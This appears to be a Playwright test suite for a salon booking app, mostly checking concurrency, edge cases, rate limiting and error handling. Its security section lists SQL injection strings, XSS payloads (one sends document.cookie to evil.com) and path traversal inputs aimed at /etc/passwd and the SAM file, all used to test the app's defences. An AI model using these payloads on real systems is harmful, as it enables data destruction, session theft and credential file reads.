import { expect, type APIResponse } from '@playwright/test';
import {
  test,
  loginAsOwner,
  loginAsStaff,
  loginAsCustomer,
  loginAsPlatformAdmin,
  expectApiError,
  expectUiError,
  captureErrorState,
  uniqueEmail,
  getTomorrowDate,
} from './utils';

test.describe('Advanced & Complex Error Scenarios', () => {
  test.describe('Concurrent Operations', () => {
    test('håndterer samtidige bookings på samme tid', async ({ page }) => {
      await loginAsOwner(page);

      // Try to create multiple bookings simultaneously
      const bookingData = {
        serviceId: 'valid-service-id',
        staffId: 'valid-staff-id',
        customerId: 'valid-customer-id',
        startTime: new Date(Date.now() + 86400000).toISOString(),
      };

      const promises = Array.from({ length: 5 }, () =>
        page.request.post('/v1/bookings', { data: bookingData }),
      );

      const results = await Promise.allSettled(promises);

      // Count successes and conflicts
      const successful = results.filter(
        (r) => r.status === 'fulfilled' && (r.value as APIResponse).ok(),
      );
      const conflicts = results.filter(
        (r) => r.status === 'fulfilled' && (r.value as APIResponse).status() === 409,
      );

      // Only one should succeed, rest should be conflicts
      expect(successful.length).toBeLessThanOrEqual(1);
      expect(conflicts.length).toBeGreaterThanOrEqual(4);
    });

    test('håndterer samtidige status opdateringer', async ({ page }) => {
      await loginAsOwner(page);

      // Create a booking first
      const createResponse = await page.request.post('/v1/bookings', {
        data: {
          serviceId: 'valid-service-id',
          staffId: 'valid-staff-id',
          customerId: 'valid-customer-id',
          startTime: new Date(Date.now() + 86400000).toISOString(),
        },
      });

      if (!createResponse.ok()) return;

      const booking = await createResponse.json();

      // Try simultaneous status updates
      const updates = [
        page.request.patch(`/v1/bookings/${booking.id}`, { data: { status: 'confirmed' } }),
        page.request.patch(`/v1/bookings/${booking.id}`, { data: { status: 'in_progress' } }),
        page.request.patch(`/v1/bookings/${booking.id}`, { data: { status: 'completed' } }),
      ];

      const results = await Promise.allSettled(updates);

      // Some should fail due to invalid transitions
      const failures = results.filter(
        (r) => r.status === 'fulfilled' && !(r.value as APIResponse).ok(),
      );

      expect(failures.length).toBeGreaterThan(0);
    });

    test('håndterer samtidige kunde opdateringer', async ({ page }) => {
      await loginAsOwner(page);

      // Get a customer
      const customers = await page.request.get('/v1/customers');
      const customerList = await customers.json();

      if (customerList.length === 0) return;

      const customerId = customerList[0].id;

      // Try simultaneous updates
      const updates = Array.from({ length: 5 }, (_, i) =>
        page.request.patch(`/v1/customers/${customerId}`, {
          data: { name: `Update ${i}` },
        }),
      );

      const results = await Promise.allSettled(updates);

      // All should succeed (last write wins)
      const allOk = results.every((r) => r.status === 'fulfilled' && (r.value as APIResponse).ok());

      expect(allOk).toBe(true);
    });
  });

  test.describe('Race Conditions', () => {
    test('håndterer hurtig oprettelse og sletning', async ({ page }) => {
      await loginAsOwner(page);

      // Create customer
      const createResponse = await page.request.post('/v1/customers', {
        data: {
          name: 'Race Condition Test',
          email: uniqueEmail('race'),
        },
      });

      if (!createResponse.ok()) return;

      const customer = await createResponse.json();

      // Immediately try to delete
      const deleteResponse = await page.request.delete(`/v1/customers/${customer.id}`);

      // Then try to update the deleted customer
      const updateResponse = await page.request.patch(`/v1/customers/${customer.id}`, {
        data: { name: 'Updated After Delete' },
      });

      // Update should fail because customer is deleted
      expect(updateResponse.status()).toBe(404);
    });

    test('håndterer booking af samme tid før commit', async ({ page }) => {
      await loginAsOwner(page);

      const bookingTime = new Date(Date.now() + 86400000).toISOString();

      // First booking
      const booking1 = await page.request.post('/v1/bookings', {
        data: {
          serviceId: 'valid-service-id',
          staffId: 'valid-staff-id',
          customerId: 'customer-1',
          startTime: bookingTime,
        },
      });

      // Immediately try second booking at same time
      const booking2 = await page.request.post('/v1/bookings', {
        data: {
          serviceId: 'valid-service-id',
          staffId: 'valid-staff-id',
          customerId: 'customer-2',
          startTime: bookingTime,
        },
      });

      // One should succeed, one should fail
      const statuses = [booking1.status(), booking2.status()];
      expect(statuses).toContain(201);
      expect(statuses).toContain(409);
    });
  });

  test.describe('Edge Cases', () => {
    test('håndterer meget lange input', async ({ page }) => {
      await loginAsOwner(page);

      const longString = 'A'.repeat(10000);

      const response = await page.request.post('/v1/customers', {
        data: {
          name: longString,
          email: uniqueEmail('long'),
          notes: longString,
        },
      });

      // Should either truncate or reject
      expect(response.status()).toBeLessThan(500);
    });

    test('håndterer specialtegn og unicode', async ({ page }) => {
      await loginAsOwner(page);

      const specialNames = [
        '🎉 Party Salon 🎊',
        'Salon & Spa <script>',
        '日本語サロン',
        'الصالون العربي',
        'Σαλόνι ομορφιάς',
        'Салон красоты',
      ];

      for (const name of specialNames) {
        const response = await page.request.patch('/v1/salons/current', {
          data: { name },
        });

        if (response.ok()) {
          const body = await response.json();
          expect(body.name).toBe(name);
        }
      }
    });

    test('håndterer tomme og null værdier', async ({ page }) => {
      await loginAsOwner(page);

      const nullTests = [{ name: null }, { email: null }, { phone: null }, { notes: null }];

      for (const testData of nullTests) {
        const response = await page.request.post('/v1/customers', {
          data: {
            name: testData.name ?? 'Test Name',
            email: testData.email ?? uniqueEmail('null'),
            phone: testData.phone,
            notes: testData.notes,
          },
        });

        // Should handle gracefully
        expect(response.status()).toBeLessThan(500);
      }
    });

    test('håndterer datogrænsetilfælde', async ({ page }) => {
      await loginAsOwner(page);

      const edgeDates = [
        '2024-02-29T10:00:00Z', // Leap year
        '2024-12-31T23:59:59Z', // Year end
        '2024-01-01T00:00:00Z', // Year start
        '2024-03-31T02:30:00Z', // DST transition (spring forward)
      ];

      for (const date of edgeDates) {
        const response = await page.request.post('/v1/bookings', {
          data: {
            serviceId: 'valid-service-id',
            staffId: 'valid-staff-id',
            customerId: 'valid-customer-id',
            startTime: date,
          },
        });

        // Should handle gracefully (may succeed or fail with specific error)
        expect(response.status()).toBeLessThan(500);
      }
    });
  });

  test.describe('Security Scenarios', () => {
    test('beskytter mod SQL injection', async ({ page }) => {
      await loginAsOwner(page);

      const sqlInjections = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "'; DELETE FROM bookings WHERE '1'='1'; --",
        "1'; UPDATE customers SET name='hacked' WHERE '1'='1",
      ];

      for (const payload of sqlInjections) {
        const response = await page.request.post('/v1/customers', {
          data: {
            name: payload,
            email: uniqueEmail('sql'),
          },
        });

        // Should either reject or sanitize
        expect(response.status()).toBeLessThan(500);

        if (response.ok()) {
          const body = await response.json();
          // Name should be stored as-is (parameterized queries handle this)
          expect(body.name).toBe(payload);
        }
      }
    });

    test('beskytter mod XSS i alle felter', async ({ page }) => {
      await loginAsOwner(page);

      const xssPayloads = [
        '<script>fetch("http://evil.com?cookie="+document.cookie)</script>',
        '<img src=x onerror="alert(\'xss\')">',
        '<svg onload="alert(\'xss\')">',
        'javascript:alert("xss")',
        '"; alert("xss"); //',
      ];

      for (const payload of xssPayloads) {
        const response = await page.request.post('/v1/customers', {
          data: {
            name: payload,
            email: uniqueEmail('xss'),
            notes: payload,
          },
        });

        if (response.ok()) {
          const body = await response.json();
          // Check that dangerous content is sanitized or escaped
          expect(body.name).not.toMatch(/<script>/i);
          expect(body.notes).not.toMatch(/<script>/i);
        }
      }
    });

    test('beskytter mod path traversal', async ({ page }) => {
      await loginAsOwner(page);

      const pathTraversalAttempts = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '/etc/passwd',
        'C:\\Windows\\System32\\config\\SAM',
      ];

      for (const path of pathTraversalAttempts) {
        const response = await page.request.get(`/v1/salons/${encodeURIComponent(path)}`);

        // Should return 404 or 400, not 200 with file content
        expect(response.status()).toBeGreaterThanOrEqual(400);
      }
    });

    test('validerer CSRF tokens', async ({ page }) => {
      await loginAsOwner(page);

      // Try to make POST request without proper headers
      const response = await page.request.post('/v1/bookings', {
        data: {
          serviceId: 'valid-service-id',
          staffId: 'valid-staff-id',
          customerId: 'valid-customer-id',
          startTime: new Date().toISOString(),
        },
        headers: {
          'X-Requested-With': '', // Remove CSRF protection header
        },
      });

      // Should either succeed (if no CSRF) or fail with specific error
      expect(response.status()).toBeLessThan(500);
    });
  });

  test.describe('Error Recovery', () => {
    test('giver meningfulde fejlbeskeder', async ({ page }) => {
      await loginAsOwner(page);

      // Trigger various errors and check messages
      const testCases = [
        {
          request: () => page.request.get('/v1/customers/invalid-id'),
          expectedError: /not found|ikke fundet/i,
        },
        {
          request: () => page.request.post('/v1/customers', { data: {} }),
          expectedError: /validation|required|påkrævet/i,
        },
        {
          request: () => page.request.get('/v1/nonexistent-endpoint'),
          expectedError: /not found|ikke fundet/i,
        },
      ];

      for (const testCase of testCases) {
        const response = await testCase.request();

        if (!response.ok()) {
          const body = await response.json().catch(() => ({}));
          const errorText = body.message || body.errorKey || body.code || '';

          if (errorText) {
            expect(errorText).toMatch(testCase.expectedError);
          }
        }
      }
    });

    test('beholder form data efter fejl', async ({ page }) => {
      await loginAsOwner(page);
      await page.goto('/owner/settings/customers');

      await page.getByTestId('add-customer-button').click();
      await page.getByTestId('customer-name-input').fill('Test Navn');
      await page.getByTestId('customer-email-input').fill('invalid-email');
      await page.getByTestId('customer-phone-input').fill('12345678');
      await page.getByTestId('save-customer-button').click();

      // Wait for error
      await expectUiError(page);

      // Check that data is preserved
      const nameValue = await page.getByTestId('customer-name-input').inputValue();
      expect(nameValue).toBe('Test Navn');
    });

    test('tillader genforsøg efter fejl', async ({ page }) => {
      await loginAsOwner(page);
      await page.goto('/owner/settings/customers');

      await page.getByTestId('add-customer-button').click();
      await page.getByTestId('customer-name-input').fill('Test Navn');
      await page.getByTestId('customer-email-input').fill('invalid');
      await page.getByTestId('save-customer-button').click();

      // Wait for error
      await expectUiError(page);

      // Fix and retry
      await page.getByTestId('customer-email-input').fill(uniqueEmail('retry'));
      await page.getByTestId('save-customer-button').click();

      // Should succeed
      await expect(page.getByText(/created|oprettet|success/i)).toBeVisible();
    });
  });

  test.describe('Rate Limiting & Throttling', () => {
    test('håndterer for mange requests', async ({ page }) => {
      await loginAsOwner(page);

      // Make many rapid requests
      const requests = Array.from({ length: 50 }, () => page.request.get('/v1/customers'));

      const results = await Promise.allSettled(requests);

      // Check if any were rate limited
      const rateLimited = results.filter(
        (r) => r.status === 'fulfilled' && (r.value as APIResponse).status() === 429,
      );

      if (rateLimited.length > 0) {
        console.log(`Rate limited ${rateLimited.length} requests`);
      }
    });

    test('håndterer for mange login forsøg', async ({ page }) => {
      for (let i = 0; i < 20; i++) {
        await page.goto('/login');
        await page.getByTestId('login-email').fill(`test${i}@example.com`);
        await page.getByTestId('login-password').fill('wrongpassword');
        await page.getByTestId('login-submit').click();
      }

      // Should eventually be rate limited
      const response = await page
        .waitForResponse((r) => r.url().includes('/v1/auth/login') && r.status() === 429, {
          timeout: 10000,
        })
        .catch(() => null);

      if (response) {
        console.log('Login rate limit triggered');
      }
    });
  });

  test.describe('Network & Infrastructure', () => {
    test('håndterer API timeout', async ({ page }) => {
      await loginAsOwner(page);

      // Simulate slow API
      await page.route('**/v1/**', async (route) => {
        await new Promise((resolve) => setTimeout(resolve, 30000));
        await route.continue();
      });

      await page.goto('/owner/settings');

      // Should show loading or error state
      const loadingOrError = page.locator(
        '.loading, .error, .timeout, [data-testid="error"], [data-testid="loading"]',
      );

      await expect(loadingOrError.first()).toBeVisible({ timeout: 5000 });
    });

    test('håndterer API nedetid', async ({ page }) => {
      await loginAsOwner(page);

      // Block all API requests
      await page.route('**/v1/**', (route) => route.abort('failed'));

      await page.goto('/owner/settings');

      await expectUiError(page, /network|forbindelse|unreachable/i);
    });

    test('håndterer delvis API nedetid', async ({ page }) => {
      await loginAsOwner(page);

      // Block only specific endpoints
      await page.route('**/v1/customers**', (route) => route.abort('failed'));

      await page.goto('/owner/settings/customers');

      await expectUiError(page, /network|forbindelse|fejl/i);
    });
  });

  test.describe('Cross-Module Integration', () => {
    test('sletter kunde påvirker ikke eksisterende bookings', async ({ page }) => {
      await loginAsOwner(page);

      // Create customer with booking
      const customer = await page.request.post('/v1/customers', {
        data: {
          name: 'Customer With Bookings',
          email: uniqueEmail('bookings'),
        },
      });

      if (!customer.ok()) return;

      const customerData = await customer.json();

      // Create booking for customer
      const booking = await page.request.post('/v1/bookings', {
        data: {
          serviceId: 'valid-service-id',
          staffId: 'valid-staff-id',
          customerId: customerData.id,
          startTime: new Date(Date.now() + 86400000).toISOString(),
        },
      });

      // Try to delete customer with active booking
      const deleteResponse = await page.request.delete(`/v1/customers/${customerData.id}`);

      // Should fail due to constraint
      expect(deleteResponse.status()).toBe(409);

      // Verify booking still exists
      if (booking.ok()) {
        const bookingData = await booking.json();
        const getBooking = await page.request.get(`/v1/bookings/${bookingData.id}`);
        expect(getBooking.ok()).toBe(true);
      }
    });

    test('sletning af staff påvirker ikke historiske bookings', async ({ page }) => {
      await loginAsOwner(page);

      // This test verifies that past bookings are preserved
      // even when staff is deleted

      // Create staff
      const staff = await page.request.post('/v1/staff', {
        data: {
          name: 'Temp Staff',
          email: uniqueEmail('temp'),
          role: 'staff',
        },
      });

      if (!staff.ok()) return;

      const staffData = await staff.json();

      // Create completed booking with this staff
      const booking = await page.request.post('/v1/bookings', {
        data: {
          serviceId: 'valid-service-id',
          staffId: staffData.id,
          customerId: 'valid-customer-id',
          startTime: new Date(Date.now() - 86400000).toISOString(), // Past
          status: 'completed',
        },
      });

      // Delete staff
      await page.request.delete(`/v1/staff/${staffData.id}`);

      // Verify booking still exists with staff reference
      if (booking.ok()) {
        const bookingData = await booking.json();
        const getBooking = await page.request.get(`/v1/bookings/${bookingData.id}`);

        if (getBooking.ok()) {
          const persistedBooking = await getBooking.json();
          expect(persistedBooking.staffId).toBe(staffData.id);
        }
      }
    });

    test('opdatering af åbningstider påvirker eksisterende bookings ikke', async ({ page }) => {
      await loginAsOwner(page);

      // Create booking outside new business hours
      const booking = await page.request.post('/v1/bookings', {
        data: {
          serviceId: 'valid-service-id',
          staffId: 'valid-staff-id',
          customerId: 'valid-customer-id',
          startTime: '2024-01-15T07:00:00Z', // Early morning
        },
      });

      if (!booking.ok()) return;

      const bookingData = await booking.json();

      // Update business hours to start at 9 AM
      await page.request.put('/v1/salons/current/business-hours', {
        data: {
          hours: [{ day: 'monday', start: '09:00', end: '17:00' }],
        },
      });

      // Verify booking still exists (not affected retroactively)
      const getBooking = await page.request.get(`/v1/bookings/${bookingData.id}`);
      expect(getBooking.ok()).toBe(true);
    });
  });

  test.describe('Complex Validation Rules', () => {
    test('validerer kompleks booking logik', async ({ page }) => {
      await loginAsOwner(page);

      const invalidBookings = [
        {
          description: 'End time before start',
          data: {
            serviceId: 'valid-service-id',
            staffId: 'valid-staff-id',
            customerId: 'valid-customer-id',
            startTime: '2024-01-15T10:00:00Z',
            endTime: '2024-01-15T09:00:00Z',
          },
        },
        {
          description: 'Duration mismatch',
          data: {
            serviceId: '60min-service',
            staffId: 'valid-staff-id',
            customerId: 'valid-customer-id',
            startTime: '2024-01-15T10:00:00Z',
            endTime: '2024-01-15T10:30:00Z', // 30 min, should be 60
          },
        },
        {
          description: 'Not 15-min aligned',
          data: {
            serviceId: 'valid-service-id',
            staffId: 'valid-staff-id',
            customerId: 'valid-customer-id',
            startTime: '2024-01-15T10:07:00Z',
          },
        },
      ];

      for (const testCase of invalidBookings) {
        const response = await page.request.post('/v1/bookings', {
          data: testCase.data,
        });

        if (!response.ok()) {
          console.log(`${testCase.description}: ${response.status()}`);
        }

        expect(response.status()).toBeGreaterThanOrEqual(400);
      }
    });

    test('validerer circular dependencies', async ({ page }) => {
      await loginAsOwner(page);

      // Try to create circular staff-service assignments
      // This should be prevented by the system

      // Staff A assigned to Service B
      // Service B requires Staff A
      // etc.

      // Implementation depends on actual constraints
    });
  });

  test.describe('Error Reporting & Debugging', () => {
    test('fanger og logger detaljerede fejl', async ({ page, testContext }) => {
      await loginAsOwner(page);

      // Trigger an error
      const response = await page.request.post('/v1/customers', {
        data: {}, // Missing required fields
      });

      expect(response.status()).toBe(400);

      // Check that error was captured in test context
      expect(testContext.apiCalls.length).toBeGreaterThan(0);

      const errorCall = testContext.apiCalls.find((call) => call.status >= 400);

      if (errorCall) {
        expect(errorCall.responseBody).toBeDefined();
      }
    });

    test('genererer trace IDs for fejl', async ({ page }) => {
      await loginAsOwner(page);

      const response = await page.request.post('/v1/customers', {
        data: {}, // Trigger error
      });

      if (!response.ok()) {
        const body = await response.json();

        // Should have trace ID for debugging
        expect(body.traceId).toBeDefined();
        expect(body.traceId.length).toBeGreaterThan(0);
      }
    });

    test('screenshot af fejl-tilstand', async ({ page }) => {
      await loginAsOwner(page);
      await page.goto('/owner/settings/customers');

      // Trigger error
      await page.getByTestId('add-customer-button').click();
      await page.getByTestId('save-customer-button').click();

      // Capture error state
      const errorState = await captureErrorState(page, 'customer-creation-error');

      expect(errorState.screenshot).toBeDefined();
    });
  });
});
